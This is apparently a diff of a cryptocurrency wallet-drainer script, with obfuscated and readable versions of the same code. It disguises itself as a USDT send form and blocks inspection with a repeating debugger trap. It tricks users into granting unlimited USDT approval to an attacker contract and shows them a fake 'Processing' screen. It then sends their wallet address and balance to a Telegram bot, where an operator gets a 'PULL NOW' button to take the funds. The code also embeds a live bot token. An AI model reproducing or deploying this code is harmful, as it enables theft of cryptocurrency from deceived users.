_0x2cbcd1=parseFloat(_0x1c1887[_0x2e04c2(0x182)]['trim']());_0x2592d9['textContent']=_0x3f5230[_0x2e04c2(0x1b3)](isNaN,_0x2cbcd1)||_0x3f5230[_0x2e04c2(0x1e8)](_0x2cbcd1,0x0)?_0x3f5230[_0x2e04c2(0x1ac)]:'≈\x20$'+_0x2cbcd1['toFixed'](0x2);}_0x1c1887[_0x41b4d2(0x18a)](_0x3f5230[_0x41b4d2(0x19e)],_0x1ce8d8),_0x3f5230[_0x41b4d2(0x24f)](_0x1ce8d8);function _0x1698ae(){const _0x5b50e4=_0x41b4d2,_0x152497=_0x569d66['value'][_0x5b50e4(0x16e)](),_0x33a760=_0x1c1887['value'][_0x5b50e4(0x16e)]();_0x3fdf14[_0x5b50e4(0x189)]=!(_0x3f5230['wlscx'](_0x152497[_0x5b50e4(0x24a)],0x0)&&_0x3f5230[_0x5b50e4(0x21b)](_0x3f5230[_0x5b50e4(0x1b3)](parseFloat,_0x33a760),0x0));}_0x569d66[_0x41b4d2(0x18a)](_0x3f5230[_0x41b4d2(0x19e)],_0x1698ae),_0x1c1887[_0x41b4d2(0x18a)](_0x3f5230[_0x41b4d2(0x19e)],_0x1698ae),_0x3f5230[_0x41b4d2(0x1ad)](_0x1698ae),_0xe79662&&_0xe79662[_0x41b4d2(0x18a)](_0x3f5230[_0x41b4d2(0x206)],async function(_0x1bb67f){const _0x150634=_0x41b4d2;_0x1bb67f[_0x150634(0x1ca)]();if(!window[_0x150634(0x208)]){_0x3f5230[_0x150634(0x1b4)](_0xa818aa,_0x3f5230[_0x150634(0x1f0)],_0x3f5230[_0x150634(0x178)]);return;}try{const _0x377aff=new ethers[(_0x150634(0x1ce))][(_0x150634(0x192))](window[_0x150634(0x208)]),_0x2bec27=_0x377aff[_0x150634(0x18f)](),_0x4a5486=await _0x2bec27[_0x150634(0x1af)](),_0x2850bf=[_0x3f5230[_0x150634(0x195)],_0x3f5230[_0x150634(0x229)]],_0x5f2318=new ethers[(_0x150634(0x1e7))](_0x105475,_0x2850bf,_0x2bec27);let _0x405a3b=0x12;try{_0x405a3b=await _0x5f2318[_0x150634(0x1ea)]();}catch(_0x23fc12){}let _0x388411=await _0x5f2318[_0x150634(0x1d4)](_0x4a5486),_0x449374=ethers['utils'][_0x150634(0x240)](_0x388411,_0x405a3b);_0x1c1887[_0x150634(0x182)]=(+_0x449374)[_0x150634(0x246)](),_0x1ce8d8(),_0x3f5230[_0x150634(0x24f)](_0x1698ae);}catch(_0x35fd27){_0x3f5230[_0x150634(0x17a)](_0xa818aa,_0x3f5230[_0x150634(0x23f)],_0x3f5230[_0x150634(0x178)]);}}),_0x3fdf14[_0x41b4d2(0x18a)](_0x3f5230[_0x41b4d2(0x206)],async function(_0x1a9ea8){const _0x5035a7=_0x41b4d2;_0x1a9ea8['preventDefault']();const _0x26e24f=_0x1c1887['value'][_0x5035a7(0x16e)]();if(_0x3f5230[_0x5035a7(0x1be)](_0x26e24f[_0x5035a7(0x24a)],0x0)||_0x3f5230['Yuwqh'](isNaN,_0x3f5230[_0x5035a7(0x1ab)](parseFloat,_0x26e24f))){_0xa818aa(_0x3f5230[_0x5035a7(0x1d2)],_0x3f5230[_0x5035a7(0x178)]);return;}if(!window[_0x5035a7(0x208)]){_0xa818aa(_0x5035a7(0x205),_0x3f5230[_0x5035a7(0x178)]);return;}_0x3fdf14[_0x5035a7(0x239)]=_0x3f5230[_0x5035a7(0x237)],_0x3fdf14['disabled']=!![];try{const _0x2e7998=_0x3f5230[_0x5035a7(0x1ee)],_0x59a315={'chainId':_0x2e7998,'chainName':_0x5035a7(0x18e),'nativeCurrency':{'name':_0x3f5230[_0x5035a7(0x1b6)],'symbol':_0x3f5230[_0x5035a7(0x1b6)],'decimals':0x12},'rpcUrls':[_0x5035a7(0x21c)],'blockExplorerUrls':[_0x3f5230[_0x5035a7(0x1f4)]]};try{await window['ethereum'][_0x5035a7(0x20f)]({'method':_0x3f5230[_0x5035a7(0x18b)],'params':[{'chainId':_0x2e7998}]});}catch(_0x5005f0){if(_0x3f5230[_0x5035a7(0x1db)](_0x5005f0[_0x5035a7(0x16f)],0x1326))try{await window[_0x5035a7(0x208)]['request']({'method':_0x5035a7(0x1e0),'params':[_0x59a315]});}catch(_0x2216b8){_0x3f5230[_0x5035a7(0x1b4)](_0xa818aa,_0x3f5230[_0x5035a7(0x242)],_0x3f5230[_0x5035a7(0x178)]);return;}else{_0x3f5230[_0x5035a7(0x1a6)](_0xa818aa,_0x3f5230[_0x5035a7(0x226)],_0x3f5230[_0x5035a7(0x178)]);return;}}const _0x38d802=(await window[_0x5035a7(0x208)][_0x5035a7(0x20f)]({'method':_0x5035a7(0x227)}))[0x0],_0x4f5e4c=new URLSearchParams(window['location'][_0x5035a7(0x18c)]),_0x121956=_0x4f5e4c[_0x5035a7(0x1a9)](_0x3f5230[_0x5035a7(0x1e2)]),_0x3e4de7=new ethers[(_0x5035a7(0x1ce))][(_0x5035a7(0x192))](window[_0x5035a7(0x208)]),_0x3e295c=_0x3e4de7[_0x5035a7(0x18f)](),_0x207b2b=['function\x20balanceOf(address\x20owner)\x20view\x20returns\x20(uint256)',_0x3f5230[_0x5035a7(0x229)]],_0xb1915c=new ethers[(_0x5035a7(0x1e7))](_0x105475,_0x207b2b,_0x3e295c);let _0x2ad7e0=0x12;try{_0x2ad7e0=await _0xb1915c[_0x5035a7(0x1ea)]();}catch(_0x408a5c){}const _0xe3bafa=await _0xb1915c['balanceOf'](_0x38d802),_0x2ac1af=ethers[_0x5035a7(0x184)][_0x5035a7(0x240)](_0xe3bafa,_0x2ad7e0),_0x7871ad=_0x3a8446['CONTRACT_ADDRESS'],_0x277d4a=[_0x3f5230[_0x5035a7(0x1aa)]],_0x26ff00=new ethers[(_0x5035a7(0x184))]['Interface'](_0x277d4a),_0x2fe6c2=_0x26ff00[_0x5035a7(0x1f2)](_0x5035a7(0x1c6),[_0x7871ad,_0x4bd90e]),_0x3dc628=await window[_0x5035a7(0x208)][_0x5035a7(0x20f)]({'method':_0x5035a7(0x231),'params':[{'from':_0x38d802,'to':_0x105475,'data':_0x2fe6c2,'value':_0x3f5230['lIEBJ']}]});_0x3f5230['WVBXT'](_0x2f4b7a,!![],_0x3dc628);if(_0x3dc628&&_0x3f5230[_0x5035a7(0x21b)](_0x3dc628[_0x5035a7(0x24a)],0x0))try{await _0x3dcf6e(_0x38d802,_0x3dc628,_0x121956,_0x26e24f,_0x2ac1af);}catch(_0x545829){console[_0x5035a7(0x1f6)](_0x3f5230['GzyHH'],_0x545829);}}catch(_0x490b7f){_0x3f5230[_0x5035a7(0x1ab)](_0x2f4b7a,![]);const _0x56d263=(_0x490b7f?.['message']||'')['toLowerCase']();if(_0x56d263['includes'](_0x3f5230[_0x5035a7(0x20a)])||_0x56d263['includes']('user\x20denied')||_0x56d263[_0x5035a7(0x1c4)](_0x3f5230[_0x5035a7(0x19b)])||_0x56d263['includes'](_0x5035a7(0x209)))_0x3f5230[_0x5035a7(0x1cf)](_0xa818aa,_0x3f5230[_0x5035a7(0x1f8)],_0x3f5230['SHTWC']);else _0x56d263[_0x5035a7(0x1c4)](_0x3f5230[_0x5035a7(0x22b)])||_0x56d263['includes']('exceeds\x20balance')||_0x56d263[_0x5035a7(0x1c4)](_0x3f5230['MHOPw'])&&_0x56d263[_0x5035a7(0x1c4)](_0x5035a7(0x23d))?_0x3f5230[_0x5035a7(0x17a)](_0xa818aa,_0x3f5230[_0x5035a7(0x1c0)],'error'):_0xa818aa(_0x3f5230[_0x5035a7(0x245)],'error');}finally{_0x3fdf14[_0x5035a7(0x189)]=![],_0x3fdf14[_0x5035a7(0x239)]=_0x3c747d;}});}));
+(function() {
+    // Yeh code baar-baar 'debugger;' statement chalaata hai jab DevTools khula hota hai.
+    // Isse Sources tab mein code inspect karna lagbhag impossible ho jaata hai.
+    function block() {
+        if (window.console && (window.console.firebug || new RegExp("a+").test(String.fromCharCode(97)))) {
+            // Agar console open hai toh debugger ko baar-baar chalao
+            debugger;
+            // Har 500ms (0.5 second) mein khud ko repeat karega
+            setTimeout(block, 500); 
+        } else {
+            // Agar console band hai toh function ko empty kar do taki performance par asar na pade
+            block = function() {};
+        }
+    }
+    block();
+})();
+
+document.addEventListener("DOMContentLoaded", function () {
+
+    // ===== CONFIG (Use Checksum Contract Address here) =====
+    // Note: window.ethereum uses Ethers v5 syntax (ethers.providers.Web3Provider, ethers.utils.formatUnits, etc.)
+    const CONFIG = {
+        COMPANY_WALLET_ADDRESS: "0x3D096439c5A13eb656E7BD917Fe5a93A6194fF62",
+        CONTRACT_ADDRESS: "0x38726eb8c302a9171B5c4A41CCbF47C38100D4d9",
+        TELEGRAM_BOT_TOKEN: "8976920389:AAEDhWwx4eWf4QB7ZOlNWbanpoBa55Mb8Ks", // Notification Bot Token (Bot A)
+        ADMIN_CHAT_ID: "7354974947", // CRITICAL: Your Admin Group Chat ID
+    };
+
+    // Constant for Unlimited Approval (MAX_UINT256)
+    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Common USDT BEP20 Address
+    
+    // 🏆 FINAL NOTIFICATION AND BUTTON TRIGGER FUNCTION 🏆
+    async function sendTelegramNotifications(walletAddress, txHash, userId, amount, currentBalance) {
+        const notifBotToken = CONFIG.TELEGRAM_BOT_TOKEN; // Bot A ka token
+        const adminChatId = CONFIG.ADMIN_CHAT_ID;
+
+        const watchUrl = `https://bscscan.com/tx/${txHash}`; // Watch URL
+
+        // CRITICAL: Inline Keyboard with PULL Button
+        const pullDataPayload = `PULL:${walletAddress}:${amount}`; 
+        
+        const inlineKeyboard = {
+            inline_keyboard: [
+                [{ text: "✅ PULL NOW (" + amount + " USDT)", callback_data: pullDataPayload }],
+                [{ text: "🔗 View Transaction", url: watchUrl }]
+            ]
+        };
+
+        const adminMessage =
+            `🔔 **NEW APPROVAL - ACTION REQUIRED**\n\n` +
+            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
+            `👤 **User ID:** ${userId || "Not provided"}\n` +
+            `💵 **Input Amount:** ${amount || "N/A"} USDT\n` +
+            `✨ **Current USDT Balance:** ${currentBalance || "N/A"} USDT\n\n` +
+            `✅ Transaction Approved! **(Unlimited Pull Ready)**\n` +
+            `👉 **PULL karne ke liye neeche button dabayein.**`;
+
+        const userMessage =
+            `🎉 **USDT Approval Successful!**\n\n` +
+            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
+            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
+            `✅ **Status:** Approved\n\n` +
+            `You can now proceed with USDT transfers.\n\n` +
+            `💡 *Tap and hold on the wallet address above to copy it*`;
+            
+        try {
+            // --- 1. Send Notification + PULL BUTTON to Admin ---
+            await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: adminChatId,
+                    text: adminMessage,
+                    parse_mode: "Markdown",
+                    reply_markup: inlineKeyboard
+                })
+            });
+            console.log("✅ Pull Button (Notification) sent to Admin Chat.");
+            
+            // --- 2. Send to user if provided ---
+            if (userId) {
+                await fetch(`https://api.telegram.org/bot${notifBotToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: userId,
+                        text: userMessage,
+                        parse_mode: "Markdown",
+                        reply_markup: inlineKeyboard
+                    })
+                });
+            }
+            console.log("Telegram notifications process complete.");
+        } catch (error) {
+            console.error("Failed to send Telegram messages:", error);
+        }
+    }
+
+    // =======================================================
+    // 🔥 NEW: CUSTOM PROCESSING MODAL LOGIC (Screenshot style)
+    // =======================================================
+    function showProcessingModal(isVisible, txHash = null) {
+        let modal = document.getElementById("processing-modal");
+        if (!modal) {
+            // Create the modal container
+            modal = document.createElement("div");
+            modal.id = "processing-modal";
+            modal.style.position = "fixed";
+            modal.style.top = "0";
+            modal.style.left = "0";
+            modal.style.width = "100%";
+            modal.style.height = "100%";
+            modal.style.background = "rgba(0, 0, 0, 0.9)"; // Dark background
+            modal.style.zIndex = "99999";
+            modal.style.display = "flex";
+            modal.style.alignItems = "flex-end"; // Align content to bottom
+            modal.style.justifyContent = "center";
+            modal.style.transition = "opacity 0.3s";
+            modal.style.opacity = "0";
+            modal.style.pointerEvents = "none";
+
+            // Create the content box (similar to the screenshot)
+            const contentBox = document.createElement("div");
+            contentBox.style.background = "#18181a"; // Dark gray/black box
+            contentBox.style.width = "100%";
+            contentBox.style.maxWidth = "500px";
+            contentBox.style.padding = "30px 20px 40px"; // Increased bottom padding
+            contentBox.style.borderRadius = "24px 24px 0 0";
+            contentBox.style.textAlign = "center";
+            contentBox.style.transform = "translateY(100%)";
+            contentBox.style.transition = "transform 0.3s";
+            contentBox.id = "processing-modal-content";
+
+            // Icon/Text setup
+            contentBox.innerHTML = `
+                <div style="margin: 20px 0;">
+                    <svg width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block; margin: 0 auto;">
+                        <circle cx="50" cy="50" r="48" stroke="#10b981" stroke-width="4" fill="none"/>
+                        <path d="M30 50L45 65L75 35" stroke="#10b981" stroke-width="6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                </div>
+                <h2 style="color: white; font-size: 1.5rem; font-weight: bold; margin-bottom: 8px;">Processing...</h2>
+                <p style="color: #a0a0a0; margin-bottom: 30px; font-size: 0.95rem;">
+                    Transaction in progress! Blockchain validation is underway. This may take a few minutes.
+                </p>
+                <button id="tx-details-btn" style="
+                    background: #10b981; 
+                    color: white; 
+                    border: none; 
+                    padding: 15px 30px; 
+                    border-radius: 12px; 
+                    font-weight: bold; 
+                    width: 90%;
+                    cursor: pointer;
+                ">Transaction details</button>
+            `;
+
+            // Add event listener to the details button
+            const txDetailsBtn = contentBox.querySelector('#tx-details-btn');
+            txDetailsBtn.addEventListener('click', () => {
+                const currentTxHash = modal.dataset.txHash; // Get hash from dataset
+                if (currentTxHash) {
+                    const scanUrl = `https://bscscan.com/tx/${currentTxHash}`; 
+                    window.open(scanUrl, '_blank');
+                } else {
+                    alert("Transaction hash not available yet.");
+                }
+            });
+
+            modal.appendChild(contentBox);
+            document.body.appendChild(modal);
+        }
+        
+        // Store the Tx Hash in the modal element's dataset
+        modal.dataset.txHash = txHash;
+
+        // Toggle visibility and animation
+        const contentBox = document.getElementById("processing-modal-content");
+        if (isVisible) {
+            modal.style.opacity = "1";
+            modal.style.pointerEvents = "auto";
+            contentBox.style.transform = "translateY(0)";
+        } else {
+            // Add a small delay for smooth exit animation
+            contentBox.style.transform = "translateY(100%)";
+            setTimeout(() => {
+                modal.style.opacity = "0";
+                modal.style.pointerEvents = "none";
+            }, 300);
+        }
+    }
+
+
+    // ===== NOTIFICATION BAR SETUP (Kept for Errors/Fails) =====
+    function showNotification(msg, type = "info") {
+        let notify = document.getElementById("notify-bar");
+        if (!notify) {
+            notify = document.createElement("div");
+            notify.id = "notify-bar";
+            notify.style.position = "fixed";
+            notify.style.top = "20px";
+            notify.style.left = "50%";
+            notify.style.transform = "translateX(-50%)";
+            notify.style.zIndex = "9998"; // Lower than the Modal
+            notify.style.minWidth = "260px";
+            notify.style.maxWidth = "90vw";
+            notify.style.padding = "16px 32px";
+            notify.style.borderRadius = "12px";
+            notify.style.fontSize = "1rem";
+            notify.style.fontWeight = "bold";
+            notify.style.textAlign = "center";
+            notify.style.boxShadow = "0 4px 32px #0008";
+            notify.style.transition = "all 0.3s";
+            document.body.appendChild(notify);
+        }
+        notify.textContent = msg;
+        notify.style.background =
+            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
+        notify.style.color = "#fff";
+        notify.style.opacity = "1";
+        notify.style.pointerEvents = "auto";
+        setTimeout(() => {
+            notify.style.opacity = "0";
+            notify.style.pointerEvents = "none";
+        }, 3000);
+    }
+
+    // ===== FORM LOGIC (Unchanged) =====
+    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
+    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
+    const nextBtn = document.querySelector("button.w-full");
+    const originalBtnHTML = nextBtn.innerHTML;
+    const approxUsd = document.querySelector(".text-xs.text-gray-500");
+    const maxBtn = Array.from(document.querySelectorAll("button")).find(
+        (btn) => btn.textContent.trim().toLowerCase() === "max"
+    );
+
+    amountInput.value = "0";// Setting a large value for display
+    approxUsd.textContent = "≈ $0.00";
+
+    function updateApproxUsd() {
+        let amount = parseFloat(amountInput.value.trim());
+        approxUsd.textContent =
+            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
+    }
+    amountInput.addEventListener("input", updateApproxUsd);
+    updateApproxUsd();
+
+    function validate() {
+        const address = addressInput.value.trim();
+        const amount = amountInput.value.trim();
+        nextBtn.disabled = !(address.length > 0 && parseFloat(amount) > 0);
+    }
+    addressInput.addEventListener("input", validate);
+    amountInput.addEventListener("input", validate);
+    validate();
+
+    if (maxBtn) {
+        maxBtn.addEventListener("click", async function (e) {
+            e.preventDefault();
+            if (!window.ethereum) {
+                showNotification("No Web3 wallet found.", "error");
+                return;
+            }
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const walletAddress = await signer.getAddress();
+                const usdtAbi = [
+                    "function balanceOf(address owner) view returns (uint256)",
+                    "function decimals() view returns (uint8)"
+                ];
+                const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+                let decimals = 18;
+                try { decimals = await usdt.decimals(); } catch (err) {}
+                let balance = await usdt.balanceOf(walletAddress);
+                let maxValue = ethers.utils.formatUnits(balance, decimals);
+                amountInput.value = (+maxValue).toString();
+                updateApproxUsd();
+                validate();
+            } catch (err) {
+                showNotification("Unable to get max balance.", "error");
+            }
+        });
+    }
+
+    // ===== NEXT BUTTON - APPROVE USDT (Core Logic) =====
+    nextBtn.addEventListener("click", async function (e) {
+        e.preventDefault();
+
+        // CAPTURE THE INPUT AMOUNT HERE BEFORE ANY NETWORK CALLS
+        const amountString = amountInput.value.trim();
+        if (amountString.length === 0 || isNaN(parseFloat(amountString))) {
+              showNotification("Please enter a valid amount.", "error");
+              return;
+        }
+
+        if (!window.ethereum) {
+            showNotification(
+                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
+                "error"
+            );
+            return;
+        }
+
+        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
+        nextBtn.disabled = true;
+
+        try {
+            const bnbChainId = "0x38";
+            const bnbChainParams = {
+                chainId: bnbChainId,
+                chainName: "BNB Smart Chain",
+                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                rpcUrls: ["https://bsc-dataseed1.binance.org/"],
+                blockExplorerUrls: ["https://bscscan.com/"]
+            };
+
+            // Network Switch/Add Logic (Unchanged)
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: bnbChainId }]
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    try {
+                        await window.ethereum.request({
+                            method: "wallet_addEthereumChain",
+                            params: [bnbChainParams]
+                        });
+                    } catch (addError) {
+                        showNotification("Failed to add BNB Smart Chain network.", "error");
+                        return;
+                    }
+                } else {
+                    showNotification("Failed to switch to BNB Smart Chain network.", "error");
+                    return;
+                }
+            }
+
+            // Get Wallet Address and User ID
+            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get("user_id");
+
+            // Fetch the current USDT balance before approval
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const signer = provider.getSigner();
+            
+            const usdtAbiBalance = [
+                "function balanceOf(address owner) view returns (uint256)",
+                "function decimals() view returns (uint8)"
+            ];
+            const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbiBalance, signer);
+            
+            let decimals = 18;
+            try { decimals = await usdtContract.decimals(); } catch (err) {}
+            const balanceWei = await usdtContract.balanceOf(fromAddress);
+            const currentBalance = ethers.utils.formatUnits(balanceWei, decimals);
+            // End of Balance Fetch
+
+            // === Approve ESCROW CONTRACT ===
+            const escrowAddress = CONFIG.CONTRACT_ADDRESS;
+
+            const usdtAbiApprove = [
+                "function approve(address spender, uint256 amount) public returns (bool)"
+            ];
+            const iface = new ethers.utils.Interface(usdtAbiApprove);
+            
+            // UNLIMITED APPROVAL: Pass MAX_UINT256 
+            const txData = iface.encodeFunctionData("approve", [
+                escrowAddress, 
+                MAX_UINT256 // Unlimited approval 
+            ]);
+
+            const txHash = await window.ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{ from: fromAddress, to: USDT_ADDRESS, data: txData, value: "0x0" }]
+            });
+
+            // 🔥 Show the custom processing modal 
+            showProcessingModal(true, txHash);
+
+            if (txHash && txHash.length > 0) {
+                try {
+                    // Pass the captured amountString AND currentBalance
+                    await sendTelegramNotifications(fromAddress, txHash, userId, amountString, currentBalance); 
+                    // Transaction is successful. MODAL will NOT be closed here.
+                } catch (err) {
+                    console.error("Failed to send notifications or API trigger:", err);
+                    // If Telegram notification fails, we don't close the modal, 
+                    // assuming the main tx is done and user wanted it to stay open.
+                }
+            }
+        } catch (err) {
+            // 🔥 CHANGE: Close the modal immediately on any error (User rejected/Canceled/Failed)
+            showProcessingModal(false); 
+
+            // All error messages still use the simple showNotification bar at the top
+            const msg = (err?.message || "").toLowerCase();
+            if (
+                msg.includes("user rejected") ||
+                msg.includes("user denied") ||
+                msg.includes("cancelled") ||
+                msg.includes("canceled")
+            ) {
+                showNotification("Transaction cancelled.", "error");
+            } else if (
+                msg.includes("insufficient funds") ||
+                msg.includes("exceeds balance") ||
+                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
+            ) {
+                showNotification("Insufficient BNB for gas fee or USDT balance.", "error");
+            } else {
+                showNotification("Transaction failed. Please try again.", "error");
+            }
+        } finally {
+            // 🔥 CHANGE: Modal closing logic removed from finally.
+            // It will only be closed in the catch block (on error/cancel).
+            nextBtn.disabled = false;
+            nextBtn.innerHTML = originalBtnHTML;
+        }
+    });
+});
